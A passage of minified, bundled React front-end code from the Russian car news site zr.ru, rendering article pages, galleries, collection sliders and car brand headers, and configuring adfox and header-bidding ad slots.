            v = (0, l.useRef)(null),
            O = (0, l.useState)(0),
            k = o()(O, 2),
            C = k[0],
            S = k[1],
            Z = b.replace(/&nbsp;/g, " "),
            Q = h ? h.replace(/&nbsp;/g, " ") : "";
          return (0, l.useEffect)(function () {
            v.current && S(v.current.clientHeight);
          }, [C]), l.createElement(st, {
            ref: v
          }, l.createElement(Xt, null, "docs" === E && m && l.createElement(ri.Z, {
            docsReference: m
          }), I && l.createElement("h1", null, I), (N || j) && l.createElement(ei, {
            advertisment: N,
            partnerStory: j
          }), l.createElement(dt, null, Q), l.createElement(gi, {
            id: y,
            xml: Z
          }), A && function (e) {
            var t = e.input,
              i = [],
              n = {
                replace: function (e) {
                  if (e instanceof ci.W_ && "div" === e.name && "gallery-panel" === e.attribs.class) return e.children.map(function (t) {
                    if (t.attribs && t.attribs.class && "g-img" === t.attribs.class) {
                      var n,
                        r = JSON.parse(t.attribs["data-gallery"]),
                        a = r.servingUrl,
                        o = r.alt,
                        l = r.width,
                        c = r.height,
                        s = "".concat(a);
                      return i.push({
                        original: s,
                        thumbnail: s,
                        description: o,
                        width: l,
                        height: c,
                        thumbnailAlt: o,
                        galleryId: (null === (n = e.attribs) || void 0 === n ? void 0 : n["data-id"]) || "gallery"
                      }), null;
                    }
                  }), l.createElement(si.default, {
                    gallery: i,
                    showPlayButton: !0,
                    hideFullIco: !0
                  });
                }
              };
            return (0, ci.ZP)(t, n);
          }({
            input: A
          }), d && l.createElement(ii.Z, {
            poll: d
          }), x && x.length > 1 && l.createElement(ni.Z, {
            pages: x,
            selected: D,
            nextHref: z,
            prevHref: T,
            isStory: !0
          }), l.createElement(ot.Z, {
            placeholderHeight: [150, 150],
            preventUnload: !0
          }, l.createElement(ti, null)), "road-notes" === L && l.createElement(vt, null, "Материал подготовлен автором личного блога. Редакция ЗР может не разделять мнения автора."), l.createElement(yi, {
            story: t,
            hasAdblock: g,
            disableSmi2: n,
            disableSvk: a,
            disableRelap: s,
            disableInRead: M,
            review: u,
            isFirstScroll: p
          })), l.createElement(Kt, {
            as: ai.Z,
            pageHeight: C
          }));
        }, li());
        function hi(e) {
          var t = e.story,
            i = e.disableSmi2,
            n = void 0 === i || i,
            r = e.disableSvk,
            a = void 0 !== r && r,
            o = e.disableRelap,
            s = void 0 !== o && o,
            M = e.disableInRead,
            d = e.ssrRender,
            g = e.storyId,
            u = t.poll,
            m = (0, c.v9)(te.S5),
            p = (0, c.v9)(te.xK),
            y = (0, c.v9)(te.e4),
            I = (0, c.v9)(te.nJ),
            N = (0, Je.sB)(),
            j = (0, c.v9)(te.$V),
            h = d ? m : u,
            x = t.bannerPlacement,
            D = d ? j : x;
          return l.createElement(Ne.DB, {
            targeting: Ni({}, D)
          }, l.createElement(ji, {
            story: t,
            disableSmi2: n,
            disableSvk: a,
            disableRelap: s,
            poll: h,
            hasAdblock: p,
            review: y,
            storyId: g,
            docsReference: I,
            isFirstScroll: N,
            disableInRead: M
          }));
        }
        var xi = s.ZP.div.withConfig({
            displayName: "styled__CollectionsHead",
            componentId: "sc-1k5x6tm-0"
          })(["background:url(", ") 100% 0 no-repeat;position:relative;overflow:hidden;height:362px;margin-left:-64px;a{color:rgb(255,255,255);}", " ", " @media (max-width:1024px){background-position:80% 0;margin-left:0rem;}"], function (e) {
            return e.$picture;
          }, (0, M.fq)("$mainPage", (0, s.iv)(['&:before{display:block;content:"";width:100%;height:100%;background-color:rgba(0,0,0,0.6);position:absolute;top:0;left:0;}'])), (0, M.fq)("$mainSlider", (0, s.iv)(["&:before{background-color:none;}"]))),
          Di = s.ZP.div.withConfig({
            displayName: "styled__CollectionsHeadContent",
            componentId: "sc-1k5x6tm-1"
          })(["display:flex;align-items:flex-start;z-index:2;max-width:800px;margin:0 auto;left:auto;height:362px;position:relative;flex-flow:column;justify-content:center;", " ", " @media (max-width:1024px){max-width:100%;width:100%;padding:1rem 12px;position:absolute;bottom:0;height:auto;background:linear-gradient(180deg,rgba(0,0,0,0) 0,#000 100%);right:0;left:0;", " ", "}"], (0, M.fq)("$mainPage", (0, s.iv)(["display:block;max-width:100%;padding:8px;"])), (0, M.fq)("$mainSlider", (0, s.iv)(["display:block;justify-content:flex-start;padding:8px;"])), (0, M.fq)("$mainPage", (0, s.iv)(["top:0;background:none;z-index:6;"])), (0, M.fq)("$mainSlider", (0, s.iv)(["top:40;background:none;z-index:6;"]))),
          fi = s.ZP.div.withConfig({
            displayName: "styled__CollectionsHeadName",
            componentId: "sc-1k5x6tm-2"
          })(["font-weight:700;font-size:40px;line-height:40px;color:#fff;a{margin:auto 0;}", " ", " @media (max-width:1024px){padding-right:0px;font-weight:400;line-height:1.75rem;font-size:1.5rem;", " ", "}"], (0, M.fq)("$mainPage", (0, s.iv)(["margin:0 52px 0 122px;display:flex;height:115px;"])), (0, M.fq)("$mainTitle", (0, s.iv)(["margin-left:32px;margin-top:0px;display:flex;height:285px;padding:0;"])), (0, M.fq)("$mainPage", (0, s.iv)(["padding-top:0rem;margin:24px;text-align:center;justify-content:center;"])), (0, M.fq)("$mainTitle", (0, s.iv)(["margin:0 12px;justify-content:center;text-align:center;padding-top:0rem;a{margin-top:0;}"]))),
          wi = s.ZP.div.withConfig({
            displayName: "styled__CollectionsShortText",
            componentId: "sc-1k5x6tm-3"
          })(["padding-top:0;margin-bottom:18px;font-size:30px;line-height:36px;color:#fff;@media (max-width:1024px){font-size:12px;margin-bottom:12px;line-height:12px;}"]),
          zi = s.ZP.div.withConfig({
            displayName: "styled__CollectionsHeadMail",
            componentId: "sc-1k5x6tm-4"
          })(["margin-top:25px;font-size:20px;color:#fff;a{color:#fff;text-decoration:underline;}@media (max-width:1024px){font-size:1rem;line-height:1rem;margin:10px 0;}"]),
          Ti = ["collection", "mainPage", "url", "mainSlider", "mainTitle"];
        function Li(e) {
          var t = e.collection,
            i = e.mainPage,
            n = e.url,
            r = e.mainSlider,
            a = e.mainTitle,
            o = q()(e, Ti),
            c = t.name,
            s = t.shortText,
            M = t.pictureMain,
            u = t.email;
          if (!M) return null;
          var m = M.href,
            p = M.servingUrl || m,
            y = "".concat(g.G3).concat(p);
          return l.createElement(xi, V()({
            $picture: y,
            $mainPage: i,
            $mainSlider: r
          }, o), l.createElement(Di, {
            $mainPage: i,
            $mainSlider: r
          }, s && l.createElement(wi, null, s), c && n ? l.createElement(fi, V()({
            $mainPage: i
          }, o, {
            $mainTitle: a
          }), l.createElement(d.rH, {
            href: n,
            color: "fff",
            weight: 800
          }, c)) : l.createElement(fi, V()({
            $mainPage: i,
            $mainTitle: a
          }, o), c), u && l.createElement(zi, {
            dangerouslySetInnerHTML: {
              __html: u
            }
          })));
        }
        var Ei = s.ZP.div.withConfig({
            displayName: "styled__CollectionStory",
            componentId: "sc-7dqdox-0"
          })(["width:253px;background-color:#ebebeb;box-sizing:border-box;overflow:hidden;margin:0 10px 1.5rem 0;height:auto;&:nth-child(3n){margin-right:0;}", " ", " ", " @media (max-width:1024px){width:calc(50% - 10px);margin:5px 5px;height:230px;", " ", " ", "}"], (0, M.fq)("$kingSize", (0, s.iv)(["width:800px;height:474px;position:relative;padding:0;margin:0;background-color:transparent;"])), (0, M.fq)("$mainPage", (0, s.iv)(["background:transparent;width:194px;margin:0 8px 0 0;"])), (0, M.fq)("$mainSlider", (0, s.iv)(["background:transparent;width:194px;margin:0 8px 0 0;"])), (0, M.fq)("$kingSize", (0, s.iv)(["width:100%;position:relative;padding:0;margin:0;height:250px;background-color:transparent;"])), (0, M.fq)("$mainPage", (0, s.iv)(["width:100%;height:200px;margin:1rem 0;"])), (0, M.fq)("$mainSlider", (0, s.iv)(["width:100%;height:200px;margin:1rem 0;"]))),
          Ai = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__CollectionPhoto",
            componentId: "sc-7dqdox-1"
          })(["display:block;text-decoration:none;color:#000;background:url(", ") 0 0 no-repeat;height:120px;background-size:cover;", ""], function (e) {
            return e.$picture;
          }, (0, M.fq)("$kingSize", (0, s.iv)(['height:474px;line-height:470px;position:absolute;text-align:center;right:0;left:0;:before{display:block;content:"";width:100%;height:100%;background-color:rgba(0,0,0,0.6);position:absolute;top:0;left:0;}']))),
          bi = s.ZP.div.withConfig({
            displayName: "styled__CollectionContent",
            componentId: "sc-7dqdox-2"
          })(["font-size:15px;padding:8px 15px 15px 15px;box-sizing:border-box;", " ", " ", " @media (max-width:1024px){padding:6px 0px;margin:6px 12px;", " ", " ", "}"], (0, M.fq)("$mainPage", (0, s.iv)(["padding:8px 6px;"])), (0, M.fq)("$mainSlider", (0, s.iv)(["padding:8px 6px;"])), (0, M.fq)("$kingSize", (0, s.iv)(["background-color:transparent;position:absolute;font-size:30px;line-height:31px;top:50%;left:50%;transform:translate(-50%,-50%);font-weight:700;width:100%;padding:0 200px 0 150px;"])), (0, M.fq)("$kingSize", (0, s.iv)(["padding:0 60px;font-size:1.75rem;line-height:1.25rem;font-weight:400;margin:0;"])), (0, M.fq)("$mainPage", (0, s.iv)(["padding:6px 0px;margin:0;"])), (0, M.fq)("$mainSlider", (0, s.iv)(["padding:6px 0px;margin:0;"]))),
          vi = s.ZP.div.withConfig({
            displayName: "styled__CollectionDescription",
            componentId: "sc-7dqdox-3"
          })(["font-size:15px;line-height:19px;", " @media (max-width:1024px){", "}"], (0, M.fq)("$kingSize", (0, s.iv)(["font-weight:700;font-size:21px;line-height:27px;color:#fff;padding-top:10px;"])), (0, M.fq)("$kingSize", (0, s.iv)(["font-size:1rem;line-height:1.4;font-weight:400;"])));
        function Oi(e) {
          var t = e.image,
            i = e.url,
            n = e.name,
            r = e.kingSize,
            a = e.shortDescription,
            o = e.showDescription,
            c = e.mainPage,
            s = e.color,
            M = e.weight,
            u = e.mainSlider;
          if (!t) return null;
          var m = t.href,
            p = t.servingUrl || m,
            y = r ? 800 : 174,
            I = "".concat(g.G3).concat(p, "=h").concat(y);
          return l.createElement(Ei, {
            $kingSize: r,
            $mainPage: c,
            $mainSlider: u
          }, i && l.createElement(Ai, {
            $kingSize: r,
            href: i,
            $picture: I
          }), l.createElement(bi, {
            $kingSize: r,
            $mainPage: c,
            $mainSlider: u
          }, l.createElement(d.rH, {
            href: i || "",
            color: s || "#000",
            weight: M
          }, n), a && o && l.createElement(vi, {
            $kingSize: r
          }, a)));
        }
        var ki = i(3546),
          Ci = "\n  .slick-track {\n    display: flex;\n    position: relative;\n    overflow: hidden;\n  }\n  .slick-prev,\n  .slick-next {\n    position: absolute;\n    top: 50%;\n    margin-top: -18px;\n    width: 20px;\n    height: 36px;\n    background: transparent url(".concat(ki.Z, ") 0 0 no-repeat;\n    border: 0;\n    font-size: 0;\n    z-index: 2;\n    cursor: pointer;\n    filter: invert(50%);\n    -webkit-filter: invert(50%);\n  }\n  @media (max-width:1024px){\n    .slick-next{\n        margin-top: -2.375rem!important;\n        padding: 0!important;\n    }\n  }\n  .slick-prev {\n    left: 15px;\n  }\n  .slick-next {\n    right: 15px;\n    transform: rotate(180deg);\n  }\n  \n  .mainSlider .slick-slider{\n        width:800px;\n        overflow: hidden;\n    }\n\n    .mainSlider .slick-arrow.slick-prev {\n        left: 0;\n        transform: translateY(-10%)!important;\n        margin-top: -3rem!important;\n    }\n    .mainSlider .slick-arrow.slick-next{\n        right:0;\n        margin-top: -3rem!important;\n        transform:translateY(-10%) rotate(180deg);\n    }\n    @media (max-width:1024px){\n        .mainSlider .slick-slider{\n            width: 100%;\n        }\n        .mainSlider .slick-arrow.slick-prev {\n            padding: 0!important;\n        }\n        .mainSlider .slick-arrow{\n          filter:none;\n        }\n    }\n"),
          Si = s.ZP.div.withConfig({
            displayName: "styled__SliderWrapper",
            componentId: "sc-srd6k6-0"
          })(["position:relative;width:800px;overflow:hidden;", " ", " ", " @media (max-width:1024px){width:100%;", " ", "}"], (0, M.fq)("$mainSlider", (0, s.iv)(["width:800px;position:absolute;transform:translateX(-50%);top:95%;left:50%;padding:0 56px;z-index:10;"])), (0, M.fq)("$mainPage", (0, s.iv)(["width:800px;position:absolute;transform:translateX(-50%);top:33%;left:50%;padding:0 56px;z-index:10;"])), Ci, (0, M.fq)("$mainSlider", (0, s.iv)(["width:55%;top:35%;"])), (0, M.fq)("$mainPage", (0, s.iv)(["width:55%;top:35%;"]))),
          Zi = i(6066);
        function Qi(e) {
          var t = e.collections,
            i = e.stories,
            n = e.size,
            r = e.slidesToShow,
            a = void 0 === r ? 1 : r,
            o = e.slidesToScroll,
            c = void 0 === o ? 1 : o,
            s = e.mainSlider,
            M = e.mainPage,
            d = e.color,
            g = e.weight,
            u = e.showDescription,
            m = {
              dots: !1,
              arrows: !0,
              slidesToShow: a,
              slidesToScroll: c,
              infinite: !0,
              responsive: [{
                breakpoint: 1024,
                settings: {
                  slidesToShow: 1
                }
              }]
            };
          return t ? l.createElement(Si, {
            $mainSlider: s,
            $mainPage: M
          }, l.createElement("div", {
            className: s || M ? "mainSlider" : ""
          }, l.createElement(Zi.Z, m, t.map(function (e) {
            var t,
              i = e.pictureCarousel,
              r = e.webname,
              a = e.name,
              o = e.shortDescription,
              c = "/collections/".concat(null === (t = e.collectionGroup) || void 0 === t ? void 0 : t.webname, "/").concat(r, "/");
            return l.createElement(Oi, {
              kingSize: n,
              url: c,
              name: a,
              image: i,
              shortDescription: o,
              mainPage: M,
              color: d,
              weight: g,
              showDescription: u,
              mainSlider: s,
              key: r
            });
          })))) : i ? l.createElement(Si, {
            $mainSlider: s,
            $mainPage: M
          }, l.createElement("div", {
            className: s || M ? "mainSlider" : ""
          }, l.createElement(Zi.Z, m, i.map(function (e) {
            var t = e.picture,
              i = e.href,
              r = e.name,
              a = e.announcementXml,
              o = e.id;
            return l.createElement(Oi, {
              kingSize: n,
              url: i,
              name: r,
              image: t,
              shortDescription: a,
              mainPage: M,
              color: d,
              weight: g,
              showDescription: u,
              mainSlider: s,
              key: o
            });
          })))) : null;
        }
        var Pi = s.ZP.div.withConfig({
            displayName: "styled__CollectionRow",
            componentId: "sc-1q3wbnj-0"
          })(["max-width:992px;padding:0 44px;margin:0 auto;@media (max-width:1024px){max-width:100%;padding:0;margin:0;}"]),
          Ui = s.ZP.div.withConfig({
            displayName: "styled__CollectionLeft",
            componentId: "sc-1q3wbnj-1"
          })(["max-width:800px;margin:0 auto;@media (max-width:1024px){max-width:100%;margin:0;}"]),
          Yi = s.ZP.div.withConfig({
            displayName: "styled__CollectionLine",
            componentId: "sc-1q3wbnj-2"
          })(["font-size:0;margin:0 -10px;display:flex;flex-flow:row wrap;align-items:stretch;justify-content:center;@media (max-width:1024px){margin:0 6px;justify-content:space-around;}"]),
          _i = s.ZP.div.withConfig({
            displayName: "styled__CollectionPost",
            componentId: "sc-1q3wbnj-3"
          })(["padding:32px 56px 0 56px;position:relative;overflow:hidden;@media (max-width:1024px){padding:0;}"]);
        function Wi(e) {
          var t = e.collection,
            i = e.cols,
            n = e.showDescription,
            r = e.weight;
          if (i) return l.createElement(_i, null, l.createElement(Pi, null, l.createElement(Ui, null, l.createElement(Yi, null, i.map(function (e) {
            var t,
              i = e.pictureMain,
              a = e.webname,
              o = e.name,
              c = e.shortDescription,
              s = "/collections/".concat(null === (t = e.collectionGroup) || void 0 === t ? void 0 : t.webname, "/").concat(a);
            return l.createElement(Oi, {
              showDescription: n,
              image: i,
              name: o,
              url: s,
              shortDescription: c,
              weight: r,
              key: s
            });
          })))));
          if (t) {
            var a = t.stories;
            return a ? l.createElement(_i, null, l.createElement(Pi, null, l.createElement(Ui, null, l.createElement(Yi, null, a.map(function (e) {
              var t = e.picture,
                i = e.href,
                n = e.name,
                a = e.id;
              return l.createElement(Oi, {
                image: t,
                name: n,
                url: i,
                weight: r,
                key: a
              });
            }))))) : null;
          }
          return null;
        }
        var Gi = i(880),
          Ri = s.ZP.div.withConfig({
            displayName: "styled__UsersList",
            componentId: "sc-1x8ziu3-0"
          })(["width:100%;"]);
        function Hi(e) {
          var t = e.users;
          return l.createElement(Ri, null, t.map(function (e) {
            return l.createElement(d.su, {
              user: e,
              key: e.id
            });
          }));
        }
        var Bi = i(8182),
          Fi = (i(5368), i(8022)),
          Ji = "\n  .slick-track {\n    display: flex;\n    position: relative;\n    overflow: hidden;\n    justify-content:space-around;\n  }\n  .slick-slide{\n    width:140px;\n  }\n  .slick-slide img{\n    height:100px;\n  }\n  \n  .slick-prev,\n  .slick-next {\n    position: absolute;\n    top: 50%;\n    margin-top: -18px;\n    width: 20px;\n    height: 36px;\n    background: transparent url(".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTciIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAxNyAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE2LjI5OTkgM0w2LjA5OTkgMTYuMUwxNi4zOTk5IDI5LjFMMTMuMzk5OSAzMkwtOS43Mjc0OGUtMDUgMTUuOEwxMy4wOTk5IDBMMTYuMjk5OSAzWiIgZmlsbD0iIzRDNEI0QiIvPgo8L3N2Zz4K", ") 0 0 no-repeat;\n    border: 0;\n    font-size: 0;\n    z-index: 2;\n    cursor: pointer;\n    @media (max-width:1024px){\n      margin-top: -2.375rem!important;\n      padding: 0!important;\n    }\n  }\n  .slick-prev {\n    left: 0;\n  }\n  .slick-next {\n    right: 0;\n    transform: rotate(180deg);\n  }\n  @media (max-width: 1024px) {\n    .slick-slide{\n      width:100%;\n    }\n  }\n"),
          Vi = (0, s.F4)(["{from{left:-150px;}to{left:100%;}}"]),
          $i = s.ZP.div.withConfig({
            displayName: "styled__SliderWrapper",
            componentId: "sc-ijhzib-0"
          })(['position:relative;width:682px;overflow:hidden;&::before{content:"";display:block;position:absolute;left:-150px;top:0;height:100%;width:150px;', " background:linear-gradient(to right,transparent 0%,#E8E8E8 50%,transparent 100%);}@media (max-width:1024px){width:auto;}", ""], (0, M.fq)("$doAnimation", (0, s.iv)(["animation:", " 1s cubic-bezier(0.4,0,0.2,1) infinite;"], Vi)), Ji),
          qi = i(385);
        function Xi(e) {
          var t = e.models,
            i = {
              dots: !1,
              useTransform: !0,
              useCss: !1,
              slidesToShow: t.length < 4 ? t.length : 4,
              slidesToScroll: 1,
              variableWidth: !0,
              responsive: [{
                breakpoint: 1024,
                settings: {
                  slidesToShow: 2,
                  slidesToScroll: 1
                }
              }, {
                breakpoint: 768,
                settings: {
                  slidesToShow: 1,
                  slidesToScroll: 1
                }
              }]
            };
          return l.createElement($i, null, l.createElement(Zi.Z, i, t.map(function (e, t) {
            return l.createElement(qi.Z, {
              model: e,
              width: 140,
              key: t
            });
          })));
        }
        var Ki = s.ZP.div.withConfig({
            displayName: "styled__BrandName",
            componentId: "sc-1f5ihri-0"
          })(["display:flex;flex-flow:row;align-items:center;margin:9px 0 1.875rem 0;h1{margin:0 0 0 20px;}img{margin-left:-60px;}@media (max-width:1024px){img{margin-left:0px;}}"]),
          en = s.ZP.span.withConfig({
            displayName: "styled__Delimeter",
            componentId: "sc-1f5ihri-1"
          })(["color:#c5c5c5;font-size:20px;line-height:20px;display:inline-block;vertical-align:middle;font-weight:400;margin:0 10px;"]),
          tn = (0, s.ZP)(d.rH).withConfig({
            displayName: "styled__AllLink",
            componentId: "sc-1f5ihri-2"
          })(["&:hover{border-color:transparent;}text-decoration:underline;"]),
          nn = i(5977);
        function rn(e) {
          var t = e.carInfo,
            i = e.models,
            n = t || {},
            r = n.carBrand,
            a = n.carModel,
            o = r || {},
            c = o.picture,
            s = o.name,
            M = o.href,
            g = a ? a.href : r && r.href || "",
            u = a ? "Отзывы" : "История",
            m = a ? "".concat(a.href, "reviews/") : r && "".concat(r.href, "about/") || "",
            p = [{
              name: "Новости",
              href: g
            }, {
              name: "Тесты и статьи",
              href: "".concat(g, "tests/")
            }, {
              name: "Медиа",
              href: "".concat(g, "media/")
            }, {
              name: u,
              href: m
            }],
            y = (0, nn.TH)().pathname;
          return l.createElement(l.Fragment, null, l.createElement(tn, {
            href: "/cars/",
            color: "#7F7F7F",
            fontSize: 18
          }, "Все автомобили"), l.createElement(Ki, null, c && l.createElement(d.Ee, {
            picture: c,
            height: 38,
            width: 40
          }), l.createElement("h1", null, l.createElement(d.rH, {
            href: M || "",
            color: "#000",
            weight: 700
          }, s), a && l.createElement(l.Fragment, null, l.createElement(en, null, ">"), a.name))), i && l.createElement(Xi, {
            models: i
          }), l.createElement(d.m2, {
            urls: p,
            path: y,
            gray: !0
          }));
        }
      },
      4343: (e, t, i) => {
        i.d(t, {
          _n: () => n,
          G3: () => r,
          wB: () => u,
          Fk: () => m,
          Pu: () => M,
          Xt: () => d,
          SI: () => g,
          Jr: () => o,
          to: () => c,
          kA: () => s,
          ws: () => l
        });
        var n = "https://www.zr.ru",
          r = "https://img.zr.ru",
          a = {
            sizes: [[336, 280], [320, 250], [300, 300], [300, 150], [300, 250], [300, 200], [320, 180]],
            bids: [{
              bidder: "adriver",
              params: {
                placementId: "123:zr_300x300_mid"
              }
            }, {
              bidder: "segmento",
              params: {
                placementId: 2343
              }
            }, {
              bidder: "otm",
              params: {
                placementId: 30432
              }
            }, {
              bidder: "betweenDigital",
              params: {
                placementId: 2427274
              }
            }, {
              bidder: "buzzoola",
              params: {
                placementId: 1233906
              }
            }, {
              bidder: "bidvol",
              params: {
                placementId: 24418
              }
            }, {
              bidder: "relap",
              params: {
                placementId: "Z1JSRZdWyTLIHx8f"
              }
            }, {
              bidder: "adfox_adsmart",
              params: {
                p1: "cuikx",
                p2: "ul"
              }
            }, {
              bidder: "adfox_imho-video",
              params: {
                p1: "cxldq",
                p2: "hiuc"
              }
            }, {
              bidder: "sape",
              params: {
                placementId: 801088
              }
            }]
          },
          o = {
            fullscreen: {
              type: "adfox",
              mark: "FullScreen Desc-Mob adfox_151125599617998783-adfox_154391157649831871",
              props: {
                ownerId: 247071,
                pp: "h",
                ps: "cmky",
                p2: "fkds",
                type: "fullscreen"
              },
              noSuspense: !0,
              withoutWrap: !0,
              ssrSlotId: "adfox_151125599617998783",
              preventUnload: !0
            },
            branding: {
              type: "adfox",
              mark: "Desk_Branding adfox_153813812787234836",
              props: {
                ownerId: 247071,
                pp: "g",
                ps: "ciji",
                p2: "fkdr"
              },
              noSuspense: !0,
              withoutWrap: !0,
              preventUnload: !0,
              withReload: !0
            },
            1: {
              type: "adfox",
              mark: "Desk_BN1 adfox_154030438745319246",
              props: {
                ownerId: 247071,
                pp: "g",
                ps: "ciji",
                p2: "fmyn"
              },
              withMinHeight: !1,
              withoutWrap: !0,
              preventUnload: !0,
              zIndex: 10001,
              noSuspense: !0
            },
            2: {
              type: "adfox",
              mark: "DESK BN_2 adfox_153813812787234836",
              props: {
                ownerId: 247071,
                pp: "g",
                ps: "ciji",
                p2: "fkdr"
              },
              withoutWrap: !0,
              noSuspense: !0,
              withMinHeight: !1,
              withReload: !0
            },
            3: {
              type: "adfox",
              mark: "DESK Mob BN_3 adfox_154391157649831871-adfox_151125599617998783",
              props: {
                ownerId: 247071,
                pp: ["g", "h"],
                ps: ["ciji", "cmky"],
                p2: ["fkds", "fkds"],
                type: "fullscreen"
              },
              withoutWrap: !0,
              noSuspense: !0,
              withMinHeight: !1
            },
            36: {
              type: "adfox",
              mark: "Desk Mob BN1 adfox_156680495796483580-adfox_157898908152812557",
              props: {
                ownerId: 247071,
                pp: ["g", "g"],
                ps: ["ciji", "cmky"],
                p2: ["gnfv", "fpwe"],
                pke: "1",
                adUnits: [{
                  sizes: [[970, 250], [980, 250], [1e3, 250]],
                  bids: [{
                    bidder: "buzzoola",
                    params: {
                      placementId: 1233897
                    }
                  }, {
                    bidder: "segmento",
                    params: {
                      placementId: 2345
                    }
                  }, {
                    bidder: "betweenDigital",
                    params: {
                      placementId: 4533906
                    }
                  }, {
                    bidder: "otm",
                    params: {
                      placementId: 30430
                    }
                  }, {
                    bidder: "adriver",
                    params: {
                      placementId: "123:zr_970x250"
                    }
                  }, {
                    bidder: "bidvol",
                    params: {
                      placementId: 13549
                    }
                  }, {
                    bidder: "sape",
                    params: {
                      placementId: 801083
                    }
                  }]
                }, {
                  sizes: [[336, 280], [320, 250], [300, 300], [300, 150], [300, 250], [300, 200], [320, 180]],
                  bids: [{
                    bidder: "adriver",
                    params: {
                      placementId: "123:zr_300x300_top"
                    }
                  }, {
                    bidder: "segmento",
                    params: {
                      placementId: 2342
                    }
                  }, {
                    bidder: "betweenDigital",
                    params: {
                      placementId: 2427273
                    }
                  }, {
                    bidder: "buzzoola",
                    params: {
                      placementId: 1233905
                    }
                  }, {
                    bidder: "bidvol",
                    params: {
                      placementId: 24417
                    }
                  }, {
                    bidder: "relap",
                    params: {
                      placementId: "HOMcQYBAf5ZsZVFR"
                    }
                  }, {
                    bidder: "adfox_adsmart",
                    params: {
                      p1: "cuikw",
                      p2: "ul"
                    }
                  }, {
                    bidder: "adfox_imho-video",
                    params: {
                      p1: "cqrsj",
                      p2: "hiua"
                    }
                  }, {
                    bidder: "sape",
                    params: {
                      placementId: 801087
                    }
                  }]
                }]
              },
              height: [250, 350],
              isSticky: !0,
              isCenterContent: !1,
              ssrSlotId: "adfox_157899230881497965",
              zIndex: 100
            },
            120: {
              type: "adfox",
              mark: "Mob-In-read adfox_157899172211919064",
              props: {
                ownerId: 247071,
                pp: "h",
                ps: "cmky",
                p2: "ghxy",
                pke: "1"
              },
              preventUnload: !0,
              noSuspense: !0,
              withMinHeight: !1,
              withoutWrap: !0
            },
            code_index_now_comments: {
              type: "adfox",
              mark: "Mob-BN2 adfox_157899230881497965",
              props: {
                ownerId: 247071,
                pp: "h",
                ps: "cmky",
                p2: "fpwe",
                adUnits: [null, a]
              },
              preventUnload: !1
            },
            category_list_2: {
              type: "adfox",
              mark: "Mob-BN2 adfox_157899230881497965",
              props: {
                ownerId: 247071,
                pp: "h",
                ps: "cmky",
                p2: "fpwe",
                adUnits: [null, a]
              },
              preventUnload: !1
            },
            category_list_6: {
              type: "adfox",
              mark: "Mob-BN3 adfox_161701499259386524",
              props: {
                ownerId: 247071,
                pp: "i",
                ps: "cmky",
                p2: "fpwe",
                adUnits: [null, {
                  sizes: [[336, 280], [320, 250], [300, 300], [300, 150], [300, 250], [300, 200], [320, 180]],
                  bids: [{
                    bidder: "adriver",
                    params: {
                      placementId: "123:zr_300x300_down"
                    }
                  }, {
                    bidder: "betweenDigital",
                    params: {
                      placementId: 2427275
                    }
                  }, {
                    bidder: "buzzoola",
                    params: {
                      placementId: 1233907
                    }
                  }, {
                    bidder: "bidvol",
                    params: {
                      placementId: 24419
                    }
                  }, {
                    bidder: "relap",
                    params: {
                      placementId: "_QL9_Tz8t16kAjQ0"
                    }
                  }, {
                    bidder: "adfox_adsmart",
                    params: {
                      p1: "cuiky",
                      p2: "ul"
                    }
                  }, {
                    bidder: "adfox_imho-video",
                    params: {
                      p1: "cqrsm",
                      p2: "hiua"
                    }
                  }, {
                    bidder: "sape",
                    params: {
                      placementId: 801089
                    }
                  }]
                }]
              },
              preventUnload: !1
            },
            code_relap_before: {
              type: "adfox",
              mark: "Mob-BN4 adfox_165529085166642364",
              props: {
                ownerId: 247071,
                pp: "ihc",
                ps: "cmky",
                p2: "fpwe",
                adUnits: [null, {
                  sizes: [[336, 280], [320, 250], [300, 300], [300, 150], [300, 250], [300, 200], [320, 180]],
                  bids: [{
                    bidder: "buzzoola",
                    params: {
                      placementId: 1234624
                    }
                  }, {
                    bidder: "betweenDigital",
                    params: {
                      placementId: 2427276
                    }
                  }, {
                    bidder: "relap",
                    params: {
                      placementId: "eklJM-EgVq1XMzMz"
                    }
                  }]
                }]
              },
              preventUnload: !1
            },
            relap_list_inner: {
              type: "adfox",
              mark: "Mob-BN2 adfox_157899230881497965",
              props: {
                ownerId: 247071,
                pp: "h",
                ps: "cmky",
                p2: "fpwe",
                pke: "1",
                adUnits: [null, a]
              },
              preventUnload: !1
            },
            relap_list_3: {
              type: "adfox",
              mark: "Mob-BN3 adfox_161701499259386524",
              props: {
                ownerId: 247071,
                pp: "i",
                ps: "cmky",
                p2: "fpwe",
                adUnits: [null, {
                  sizes: [[336, 280], [320, 250], [300, 300], [300, 150], [300, 250], [300, 200], [320, 180]],
                  bids: [{
                    bidder: "adriver",
                    params: {
                      placementId: "123:zr_300x300_down"
                    }
                  }, {
                    bidder: "betweenDigital",
                    params: {
                      placementId: 2427275
                    }
                  }, {
                    bidder: "buzzoola",
                    params: {
                      placementId: 1233907
                    }
                  }, {
                    bidder: "bidvol",
                    params: {
                      placementId: 24419
                    }
                  }, {
                    bidder: "relap",
                    params: {
                      placementId: "_QL9_Tz8t16kAjQ0"
                    }
                  }, {
                    bidder: "adfox_adsmart",
                    params: {
                      p1: "cuiky",
                      p2: "ul"
                    }
                  }, {
                    bidder: "adfox_imho-video",
                    params: {
                      p1: "cqrsm",
                      p2: "hiua"
                    }
                  }, {
                    bidder: "sape",
                    params: {
                      placementId: 801089
                    }
                  }]
                }]
              },
              preventUnload: !1
            },
            6: {
              type: "adfox",
              mark: "Desc BN6 adfox_15379466693177350",
              props: {
                ownerId: 247071,
                pp: "g",
                ps: "ciji",
                p2: "fkdo",
                adUnits: [{
                  sizes: [[300, 600], [240, 400], [300, 300], [300, 500]],
                  bids: [{
                    bidder: "adriver",
                    params: {
                      placementId: "123:zr_300x600_top"
                    }
                  }, {
                    bidder: "segmento",
                    params: {
                      placementId: 2344
                    }
                  }, {
                    bidder: "otm",
                    params: {
                      placementId: 30428
                    }
                  }, {
                    bidder: "betweenDigital",
                    params: {
                      placementId: 4534289
                    }
                  }, {
                    bidder: "buzzoola",
                    params: {
                      placementId: 1233899
                    }
                  }, {
                    bidder: "bidvol",
                    params: {
                      placementId: 24409
                    }
                  }, {
                    bidder: "relap",
